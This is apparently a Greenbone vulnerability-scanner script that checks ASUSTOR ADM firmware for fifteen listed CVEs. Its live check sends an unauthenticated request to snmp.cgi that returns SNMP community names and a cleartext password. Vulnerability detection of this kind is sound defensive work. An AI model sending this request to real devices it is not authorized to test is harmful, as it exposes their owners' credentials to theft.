CPE = "cpe:/h:asustor:adm_firmware";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141755" );
	script_version( "2021-06-22T02:00:27+0000" );
	script_tag( name: "last_modification", value: "2021-06-22 02:00:27 +0000 (Tue, 22 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-12-05 10:58:25 +0700 (Wed, 05 Dec 2018)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)" );
	script_cve_id( "CVE-2018-12305", "CVE-2018-12306", "CVE-2018-12307", "CVE-2018-12308", "CVE-2018-12309", "CVE-2018-12310", "CVE-2018-12311", "CVE-2018-12312", "CVE-2018-12313", "CVE-2018-12314", "CVE-2018-12315", "CVE-2018-12316", "CVE-2018-12317", "CVE-2018-12318", "CVE-2018-12319" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "ASUSTOR ADM < 3.1.3.RHU2 Multiple Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_asustor_adm_detect.sc" );
	script_mandatory_keys( "asustor_adm/detected" );
	script_tag( name: "summary", value: "ASUSTOR ADM is prone to multiple vulnerabilities." );
	script_tag( name: "insight", value: "ASUSTOR ADM is prone to multiple vulnerabilities:

  - Cross-Site Scripting via SVG Images (CVE-2018-12305)

  - Directory Traversal via download.cgi (CVE-2018-12306)

  - Command Injection in user.cgi (CVE-2018-12307)

  - Shared Folder Encryption Key Sent as URL Parameter (CVE-2018-12308)

  - Directory Traversal via upload.cgi (CVE-2018-12309)

  - Cross-Site Scripting on Login page (CVE-2018-12310)

  - Missing Input Sanitization on File Explorer filenames (CVE-2018-12311)

  - Missing Input Sanitization on File Explorer filenames (CVE-2018-12311)

  - Unauthenticated Command Injection in SNMP API (CVE-2018-12313)

  - Directory Traversal via downloadwallpaper.cgi (CVE-2018-12314)

  - Password Change Does Not Require Existing Password (CVE-2018-12315)

  - Command Injection in upload.cgi (CVE-2018-12316)

  - Command Injection in group.cgi (CVE-2018-12317)

  - snmp.cgi Returns Password in Cleartext (CVE-2018-12318)

  - Login Denial of Service (CVE-2018-12319)" );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "affected", value: "ASUSTOR ADM prior to 3.1.3.RHU2." );
	script_tag( name: "solution", value: "Update to version 3.1.3.RHU2 or later." );
	script_xref( name: "URL", value: "https://blog.securityevaluators.com/unauthenticated-remote-code-execution-in-asustor-as-602t-2d806c30dcea" );
	script_xref( name: "URL", value: "https://blog.securityevaluators.com/over-a-dozen-vulnerabilities-discovered-in-asustor-as-602t-8dd5832a82cc" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port, nofork: TRUE )){
	exit( 0 );
}
url = "/portal/apis/services/snmp.cgi?act=get&tab=Get&_dc=1530552418588";
headers = make_array( "X-Requested-With", "XMLHttpRequest", "Content-Length", "0" );
req = http_post_put_req( port: port, url: url, add_headers: headers );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
if(ContainsString( res, "\"success\": true" ) && ContainsString( res, "\"passwd\":" )){
	report = "It was possible to obtain the SNMP settings including the community names and password." + "\n\nResult:\n" + res;
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

